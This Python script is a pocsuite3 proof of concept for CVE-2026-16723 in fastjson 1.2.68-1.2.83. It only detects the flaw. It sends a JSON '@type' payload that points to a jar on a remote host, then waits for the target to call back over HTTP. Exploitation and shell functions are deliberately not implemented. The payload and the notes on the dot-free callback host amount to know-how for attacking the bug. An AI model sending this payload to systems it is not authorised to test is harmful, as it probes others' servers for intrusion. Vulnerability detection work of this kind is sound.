#!/usr/bin/env python3
"""
CVE-2026-16723 - Fastjson 1.2.68-1.2.83 Default Config RCE Detection

pocsuite3 PoC (detection only). Uses the orchestrator-verified *HTTP callback*
detection mechanism of CVE-2026-16723:

  fastjson's checkAutoType turns the @type typeName into a resource path via
  typeName.replace('.', '/') and probes it with getResourceAsStream. For a jar:
  URL this makes the classloader (Spring Boot's LaunchedURLClassLoader) issue an
  outbound HTTP GET to the attacker — a reliable, out-of-band positive signal
  that the target reaches the vulnerable fastjson code path.

  Detection therefore relies on observing the callback, NOT on the HTTP response
  body (which is always "autoType is not support. jar:..." regardless of success).

Hard constraints verified by the orchestrator (do NOT re-investigate):
  1. The callback host MUST be dot-free. fastjson replaces EVERY '.' in the whole
     typeName with '/', so "192.168.1.5" -> "192/168/1/5" and
     "host.docker.internal" -> "host/docker/internal"; such requests never
     resolve. Use a dot-free name (Docker service name, intranet DNS host, or the
     dot-free part of socket.gethostname()).
  2. The path is rewritten too ("probe.jar" -> "probe/jar"), so the callback
     listener answers on ANY path — we simply observe whether a GET arrives.
  3. End-to-end RCE is NOT reproducible in the verified lab shape (fastjson
     1.2.83 + Spring Boot fat-jar + JDK8): URLClassPath.findClass yields a
     defineClass name/bytecode mismatch (JVM "Wrong name") and loadClass fails.
     The official advisory's end-to-end RCE requires undisclosed prerequisites.
     This PoC therefore only DETECTS; _attack/_shell are intentionally not
     implemented.
  4. nuclei interactsh OAST is mechanically unusable here (interactsh domains
     contain dots, broken by the same replace), which is why this lives in the
     POC repo rather than as a nuclei template.

References:
  - https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83
  - https://nvd.nist.gov/vuln/detail/CVE-2026-16723
"""

import json
import socket
import time
import secrets
import string
import threading
from collections import OrderedDict
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from pocsuite3.api import (
    Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY
)
from pocsuite3.lib.core.interpreter_option import OptString


def randstr(n: int = 8) -> str:
    """Random lowercase+digits token (pocsuite3 reproducibility convention)."""
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


class _CallbackState:
    """Records inbound GETs on the listener. Lives on the server instance so the
    per-request handler can reach it via self.server."""

    def __init__(self):
        self.hit = False
        self.paths = []

    def mark(self, path):
        self.hit = True
        self.paths.append(path)


class _ProbeHandler(BaseHTTPRequestHandler):
    """Records ANY inbound GET. fastjson rewrites the request path, so matching
    is path-agnostic (constraint 2); we only need to know a GET arrived."""

    # Silence default stderr request logging; this PoC logs its own lines.
    def log_message(self, *args):  # noqa: D401
        pass

    def do_GET(self):
        state = self.server.callback_state
        state.mark(self.path)
        logger.info("[run %s] callback GET received: %s" % (self.server.run_id, self.path))
        # No body needed; fastjson discards the response either way.
        self.send_response(404)
        self.end_headers()


class _CallbackHTTPServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr, handler, state, run_id):
        super().__init__(addr, handler)
        self.callback_state = state
        self.run_id = run_id


class CVE202616723POC(POCBase):
    """Fastjson 1.2.68-1.2.83 default-config RCE detection (CVE-2026-16723)."""

    pocInfo = {
        'name': 'Fastjson 1.2.68-1.2.83 Default Config RCE Detection (CVE-2026-16723)',
        'vulID': 'CVE-2026-16723',
        'author': 'RBKD-SEC',
        'vulType': VUL_TYPE.CODE_EXECUTION,
        'category': POC_CATEGORY.EXPLOITS.WEBAPP,
        'version': '1.0',
        'references': [
            'https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-16723',
        ],
        'appName': 'Fastjson',
        'appVersion': '1.2.68 - 1.2.83',
        'desc': '''
            CVE-2026-16723: fastjson 1.2.68-1.2.83 in default configuration is
            reachable to a checkAutoType bypass via a jar: @type. fastjson turns
            the typeName into a resource path (replace('.', '/')) and probes it
            with getResourceAsStream, which makes the classloader issue an
            outbound HTTP GET — an out-of-band detection signal.

            DETECTION MECHANISM (this PoC): start a local HTTP listener, POST
            {"@type":"jar:http://<host>:<port>/probe.jar!/EvilPayload"} as JSON,
            and treat an inbound GET to the listener as a positive result. The
            HTTP response body is NOT used (it is always an autoType error).

            CRITICAL: the callback host MUST be dot-free. fastjson replaces every
            '.' in the typeName with '/', so dotted hosts/IPs are mangled and the
            request never resolves. Use a dot-free name (Docker service name,
            intranet DNS host, or the dot-free part of the machine hostname).
        ''',
        'install_requires': ['requests>=2.20.0'],
    }

    def _options(self):
        opt = OrderedDict()
        hostname = socket.gethostname().split('.')[0]
        opt["callback_host"] = OptString(
            hostname,
            description="Dot-free host the TARGET uses to reach back to this PoC's "
                        "listener. fastjson replace('.','/') breaks dotted hosts/IPs "
                        "(e.g. 192.168.1.5 -> 192/168/1/5, host.docker.internal -> "
                        "host/docker/internal), so a dot-free name (Docker service "
                        "name / intranet DNS / hostname) is REQUIRED.",
            require=False
        )
        opt["callback_port"] = OptString(
            "0",
            description="Listener port. 0 = let the OS choose a random free port "
                        "(the actual port is read back from the bound socket and "
                        "embedded in the payload).",
            require=False
        )
        return opt

    # --------------------------------------------------------------- detection
    def _verify(self):
        output = Output(self)
        run_id = randstr(6)

        callback_host = (self.get_option("callback_host") or "").strip()
        if not callback_host:
            callback_host = socket.gethostname().split('.')[0]

        if "." in callback_host:
            logger.warning(
                "[run %s] callback_host %r contains dots — fastjson replace('.','/') "
                "will mangle it and the callback will not resolve. Use a dot-free host."
                % (run_id, callback_host)
            )

        try:
            port = int(self.get_option("callback_port") or "0")
        except (TypeError, ValueError):
            port = 0

        state = _CallbackState()
        server = None
        thread = None
        try:
            server = _CallbackHTTPServer(("0.0.0.0", port), _ProbeHandler, state, run_id)
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()

            # Actual port (matters when port == 0 -> OS-assigned random port).
            actual_port = server.server_address[1]
            time.sleep(0.3)  # let serve_forever enter its select loop

            payload = {
                "@type": "jar:http://%s:%d/probe.jar!/EvilPayload"
                         % (callback_host, actual_port)
            }
            body = json.dumps(payload)
            target = self.url.rstrip("/") + "/"

            logger.info(
                "[run %s] sending fastjson jar: probe to %s (callback %s:%d)"
                % (run_id, target, callback_host, actual_port)
            )
            try:
                # Response body is non-deterministic (always an autoType error),
                # so we do not inspect it. We only need fastjson to issue the GET.
                requests.post(
                    target,
                    data=body,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )
            except Exception as e:
                logger.debug(
                    "[run %s] probe POST raised (target may be unreachable): %s"
                    % (run_id, str(e))
                )

            # Poll for the out-of-band callback (~15s window).
            deadline = time.time() + 15
            while time.time() < deadline and not state.hit:
                time.sleep(0.3)

            if state.hit:
                logger.info(
                    "[run %s] vulnerable: HTTP callback observed via jar: resource probing"
                    % run_id
                )
                result = {
                    'VerifyInfo': {
                        'URL': self.url,
                        'Callback': 'http://%s:%d%s' % (
                            callback_host, actual_port,
                            state.paths[0] if state.paths else "/"
                        ),
                        'Mechanism': 'HTTP callback via fastjson jar: resource probing '
                                     '(checkAutoType -> getResourceAsStream)',
                        'Payload': body,
                    },
                }
                output.success(result)
                return output

            output.fail(
                "No HTTP callback observed (target may not be vulnerable, or the "
                "callback host is unreachable / dotted)"
            )
            return output
        except OSError as e:
            output.fail("failed to start callback listener: %s" % str(e))
            return output
        finally:
            # shutdown() must be called from a thread OTHER than serve_forever's;
            # it runs in the daemon thread, so this main-thread call is safe.
            if server is not None:
                try:
                    server.shutdown()
                except Exception:  # noqa
                    pass
                try:
                    server.server_close()
                except Exception:  # noqa
                    pass
            if thread is not None:
                try:
                    thread.join(timeout=2)
                except Exception:  # noqa
                    pass

    # ----------------------------------------------------- (intentionally none)
    def _attack(self):
        output = Output(self)
        output.fail(
            "Exploitation not implemented. Orchestrator-verified lab experiments "
            "(fastjson 1.2.83 + Spring Boot fat-jar + JDK8) confirmed the jar is "
            "fetchable (callback GET 200) but URLClassPath.findClass produces a "
            "defineClass name/bytecode mismatch (JVM 'Wrong name'), so loadClass "
            "fails and end-to-end RCE does not work in that shape. The official "
            "advisory's end-to-end RCE requires undisclosed prerequisites. This "
            "PoC supports detection only (--verify)."
        )
        return output

    def _shell(self):
        logger.error(
            "Interactive shell not implemented: end-to-end RCE is not reproducible "
            "in the verified lab shape (defineClass name mismatch). Detection only "
            "(--verify)."
        )


register_poc(CVE202616723POC)
